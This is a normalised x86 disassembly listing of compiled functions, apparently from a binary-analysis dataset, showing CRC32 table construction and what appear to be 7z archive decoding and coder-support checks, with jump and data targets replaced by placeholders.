sub_401000
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
call sub_40f6c9
add esp 0x4
xor eax eax
jmp r-xdata
pop ebp
retn
sub_401070
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0x0
mov eax 0x1
jmp r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov eax 0x1
jmp r-xdata
pop ebp
retn
sub_4010d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] 0x0
pop ebp
retn
sub_401100
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] ecx
push rw-data
mov eax [ ebp - 0x4 ]
push eax
mov edx [ ebp - 0x8 ]
or ecx 0xffffffff
call [ rw-data ]
xor eax 0xffffffff
mov esp ebp
pop ebp
retn
sub_401130
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x100
jae r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x800
jae r-xdata
cmp [ ebp - 0xc ] 0x8
jae r-xdata
mov [ rw-data ] sub_401200
call sub_407430
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx * 4 + rw-data ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
and ecx 0xff
mov edx [ ebp - 0x10 ]
shr edx 0x8
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax * 4 + rw-data ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx * 4 + rw-data ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
shr eax 0x1
mov ecx [ ebp - 0x8 ]
and ecx 0x1
sub ecx 0x1
not ecx
and ecx 0xedb88320
xor eax ecx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ rw-data ] sub_401310
mov ecx [ ebp - 0x4 ]
add ecx 0x1
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_401200
push ebp
mov ebp esp
sub esp 0xc
push esi
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
and eax 0x3
je r-xdata
cmp [ ebp + 0x8 ] 0x4
jb r-xdata
mov ecx [ ebp - 0x8 ]
movzx edx [ ecx ]
xor edx [ ebp - 0x4 ]
and edx 0xff
mov eax [ ebp - 0x4 ]
shr eax 0x8
mov ecx [ ebp + 0xc ]
xor eax [ ecx + edx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
and ecx 0xff
mov edx [ ebp + 0xc ]
mov esi [ ebp + 0xc ]
mov eax [ edx + eax * 4 + 0xc00 ]
xor eax [ esi + ecx * 4 + 0x800 ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x10
and ecx 0xff
mov edx [ ebp + 0xc ]
xor eax [ edx + ecx * 4 + 0x400 ]
mov ecx [ ebp - 0x4 ]
shr ecx 0x18
mov edx [ ebp + 0xc ]
xor eax [ edx + ecx * 4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
sub ecx 0x1
mov [ ebp + 0x8 ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov edx [ ebp + 0x8 ]
sub edx 0x4
mov [ ebp + 0x8 ] edx
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x8 ]
movzx eax [ edx ]
xor eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
mov edx [ ebp + 0xc ]
xor ecx [ edx + eax * 4 ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
sub eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
sub_401310
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call sub_401200
mov esp ebp
pop ebp
retn 0x8
sub_401340
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x88 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov [ ebp - 0x74 ] 0x0
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40a7d0
add esp 0x10
mov [ ebp - 0x8c ] eax
cmp [ ebp - 0x8c ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x70 ] eax
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x5c ] ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40a180
add esp 0x4
mov eax [ ebp - 0x8c ]
jmp r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
ja r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x60 ]
mov [ ebp - 0x90 ] edx
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp - 0x84 ]
push ecx
call sub_40a260
add esp 0x18
mov [ ebp - 0x88 ] eax
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
xor eax eax
mov ecx [ ebp + 0xc ]
sub ecx [ ebp - 0xc ]
mov edx [ ebp + 0x10 ]
sbb edx eax
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x10 ] edx
cmp [ ebp - 0x88 ] 0x0
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x98 ]
cmp eax [ ebp + 0xc ]
jbe r-xdata
mov eax [ ebp - 0x60 ]
cmp eax [ ebp - 0x5c ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
lea edx [ ebp - 0x84 ]
push edx
call sub_40a630
add esp 0x8
mov eax [ ebp - 0x88 ]
mov edx [ ebp - 0x5c ]
cmp edx [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x88 ] 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
mov eax [ edx + 0x4 ]
call eax
add esp 0x8
mov [ ebp - 0x88 ] eax
cmp [ ebp - 0x88 ] 0x0
je r-xdata
mov ecx [ ebp - 0x90 ]
cmp ecx [ ebp - 0x60 ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x10 ] 0x4
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x40000
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] ecx
mov edx [ ebp - 0x94 ]
cmp edx [ ebp + 0x10 ]
jb r-xdata
sub_401520
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xa4 ] 0x0
mov [ ebp - 0x8c ] 0x0
mov [ ebp - 0x90 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x1
je r-xdata
mov ecx [ ebp + 0x20 ]
push ecx
mov edx 0x1
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
movzx edx [ ecx + edx ]
push edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_407600
add esp 0xc
mov [ ebp - 0xa8 ] eax
cmp [ ebp - 0xa8 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x8c ] ecx
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x78 ] edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_407660
add esp 0x4
mov eax [ ebp - 0xa8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0xc
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
ja r-xdata
mov edx [ ebp - 0x8 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x7c ]
mov [ ebp - 0xb4 ] eax
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp + 0x1c ]
push ecx
lea edx [ ebp - 0xa0 ]
push edx
call sub_407940
add esp 0x18
mov [ ebp - 0xa4 ] eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
xor ecx ecx
mov edx [ ebp + 0xc ]
sub edx [ ebp - 0xc ]
mov eax [ ebp + 0x10 ]
sbb eax ecx
mov [ ebp + 0xc ] edx
mov [ ebp + 0x10 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0xb0 ]
cmp ecx [ ebp + 0xc ]
jbe r-xdata
mov ecx [ ebp - 0x7c ]
cmp ecx [ ebp - 0x78 ]
je r-xdata
jmp r-xdata
mov edx [ ebp + 0x20 ]
push edx
lea eax [ ebp - 0xa0 ]
push eax
call sub_40a630
add esp 0x8
mov eax [ ebp - 0xa4 ]
mov eax [ ebp - 0x78 ]
cmp eax [ ebp + 0x1c ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0xa4 ] 0x1
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
call ecx
add esp 0x8
mov [ ebp - 0xa4 ] eax
cmp [ ebp - 0xa4 ] 0x0
je r-xdata
mov edx [ ebp - 0xb4 ]
cmp edx [ ebp - 0x7c ]
jne r-xdata
cmp [ ebp - 0x10 ] 0x1
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x8 ] 0x40000
mov ecx [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0xb0 ] ecx
mov [ ebp - 0xac ] edx
mov eax [ ebp - 0xac ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
sub_401710
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x40000
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] ecx
mov edx [ ebp - 0x18 ]
cmp edx [ ebp + 0xc ]
jb r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
lea edx [ ebp - 0x8 ]
push edx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
call eax
add esp 0xc
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
ja r-xdata
xor eax eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x1c ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
call sub_412c10
add esp 0xc
mov ecx [ ebp + 0x14 ]
add ecx [ ebp - 0x8 ]
mov [ ebp + 0x14 ] ecx
xor edx edx
mov eax [ ebp + 0x8 ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
sbb ecx edx
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] ecx
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx + 0x4 ]
call edx
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax 0x6
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
sub_401800
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x21
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x30101
je r-xdata
jmp r-xdata
xor eax eax
sub_401830
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
ja r-xdata
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
push eax
call sub_401800
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x8 ] 0xffffffff
ja r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_401890
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x10 ] 0x1
jb r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jbe r-xdata
mov esp ebp
pop ebp
retn
mov edx 0x18
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_401830
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x1
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x2
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x18 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jne r-xdata
mov edx 0x18
shl edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x8 ]
cmp [ edx + 0xc ] 0x0
ja r-xdata
mov eax 0x4
jmp r-xdata
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
cmp [ eax + edx ] 0x0
jne r-xdata
mov eax 0x4
mov edx 0x18
shl edx 0x0
mov eax [ ebp + 0x8 ]
add edx [ eax ]
push edx
call sub_401830
add esp 0x4
test eax eax
je r-xdata
mov eax 0x4
jmp r-xdata
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov ecx 0x18
shl ecx 0x1
mov edx [ ebp + 0x8 ]
add ecx [ edx ]
push ecx
call sub_401830
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0xffffffff
ja r-xdata
xor eax eax
jmp r-xdata
mov eax 0x18
imul eax eax 0x3
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
cmp [ ecx + eax + 0x8 ] 0x303011b
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x4 ] 0x1
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
cmp [ eax + edx + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov ecx 0x18
imul ecx ecx 0x3
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + ecx ] 0x4
jne r-xdata
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
cmp [ ecx + eax ] 0x0
jne r-xdata
mov ecx 0x18
imul ecx ecx 0x3
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x14 ] 0x1
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x18 ] 0x4
jne r-xdata
mov edx 0x8
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edx ] 0x1
jne r-xdata
mov eax 0x4
jmp r-xdata
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x2
jne r-xdata
mov edx 0x8
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edx + 0x4 ] 0x0
je r-xdata
mov edx 0x4
shl edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x6
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x3030103
je r-xdata
mov edx 0x4
shl edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebp - 0xc ] 0x3030501
je r-xdata
mov edx 0x4
imul edx edx 0x3
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
cmp [ edx + ecx ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x14 ] 0x3
jne r-xdata
mov eax 0x4
jmp r-xdata
mov eax 0x8
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x5
jne r-xdata
mov eax 0x8
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x0
jne r-xdata
mov eax 0x8
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x4
jne r-xdata
mov eax 0x8
shl eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x1
jne r-xdata
mov eax 0x8
shl eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax ] 0x3
jne r-xdata
mov eax 0x8
shl eax 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
cmp [ edx + eax + 0x4 ] 0x2
je r-xdata
xor eax eax
jmp r-xdata
sub_401b90
push ebp
mov ebp esp
sub esp 0xc
push esi
xorpd xmm0 xmm0
movlpd [ ebp - 0xc ] xmm0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
add ecx [ eax + edx * 8 ]
mov esi [ ebp - 0x8 ]
adc esi [ eax + edx * 8 + 0x4 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_401be0
push ebp
mov ebp esp
sub esp 0xc4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x3c ] 0x0
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x88 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_401890
add esp 0x4
mov [ ebp - 0x78 ] eax
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x78 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
cmp eax [ edx + 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
xor eax eax
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x18
mov edx [ ebp + 0x8 ]
add ecx [ edx ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x8 ]
push ecx
call sub_401800
add esp 0x4
test eax eax
je r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x5c ] ecx
mov edx [ ebp - 0x5c ]
cmp [ edx + 0x8 ] 0x303011b
jne r-xdata
mov [ ebp - 0x2c ] 0x0
mov edx [ ebp + 0x1c ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x10 ] 0x4
jne r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0x5c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_401b90
add esp 0x8
mov [ ebp - 0xb8 ] eax
mov [ ebp - 0xb4 ] edx
mov ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ edx + ecx * 8 ]
mov [ ebp - 0x20 ] eax
mov ecx [ edx + ecx * 8 + 0x4 ]
mov [ ebp - 0x1c ] ecx
mov edx [ ebp + 0x14 ]
add edx [ ebp - 0xb8 ]
mov eax [ ebp + 0x18 ]
adc eax [ ebp - 0xb4 ]
push eax
push edx
mov ecx [ ebp + 0x10 ]
push ecx
call sub_406590
add esp 0xc
mov [ ebp - 0x84 ] eax
cmp [ ebp - 0x84 ] 0x0
je r-xdata
mov [ ebp - 0xc4 ] 0x3
mov [ ebp - 0xc0 ] 0x2
mov [ ebp - 0xbc ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx [ eax + ecx * 8 ]
mov [ ebp - 0x28 ] edx
mov eax [ eax + ecx * 8 + 0x4 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp + ecx * 4 - 0xc4 ]
mov [ ebp - 0x2c ] edx
cmp [ ebp - 0xc ] 0x2
jae r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x64 ] ecx
mov edx [ eax + 0xc ]
mov [ ebp - 0x60 ] edx
cmp [ ebp - 0x64 ] 0x3030103
jne r-xdata
mov eax 0x4
jmp r-xdata
push 0x1
mov ecx [ ebp + 0xc ]
push ecx
call sub_401b90
add esp 0x8
mov [ ebp - 0x98 ] eax
mov [ ebp - 0x94 ] edx
mov edx 0x8
shl edx 0x0
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx ]
mov [ ebp - 0x48 ] ecx
mov edx [ eax + edx + 0x4 ]
mov [ ebp - 0x44 ] edx
cmp [ ebp - 0xc ] 0x3
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x6c ] edx
mov eax [ ebp - 0x6c ]
mov ecx [ ebp - 0x6c ]
mov edx [ eax + 0x8 ]
or edx [ ecx + 0xc ]
jne r-xdata
mov eax [ ebp - 0x84 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor edx edx
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x8c ] edx
mov eax [ ebp - 0x90 ]
cmp eax [ ebp - 0x28 ]
jne r-xdata
cmp [ ebp - 0x64 ] 0x3030501
jne r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
add eax [ ebp - 0x98 ]
mov ecx [ ebp + 0x18 ]
adc ecx [ ebp - 0x94 ]
push ecx
push eax
mov edx [ ebp + 0x10 ]
push edx
call sub_406590
add esp 0xc
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x58 ] edx
mov eax [ ebp - 0x58 ]
cmp [ eax + 0x8 ] 0x30101
jne r-xdata
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0x20 ]
cmp edx [ ebp - 0xa8 ]
jne r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp + 0x20 ]
xor ecx ecx
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0x24 ]
cmp edx [ ebp - 0xac ]
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x8c ]
cmp ecx [ ebp - 0x24 ]
je r-xdata
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x0
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ ebp + 0x20 ]
push ecx
mov edx [ ebp + 0x1c ]
push edx
call sub_406fa0
add esp 0x14
jmp r-xdata
mov eax [ ebp - 0x48 ]
mov ecx 0x4
shl ecx 0x1
mov [ ebp + ecx - 0x40 ] eax
mov edx 0x4
shl edx 0x1
mov eax [ ebp + edx - 0x40 ]
xor ecx ecx
mov [ ebp - 0xa0 ] eax
mov [ ebp - 0x9c ] ecx
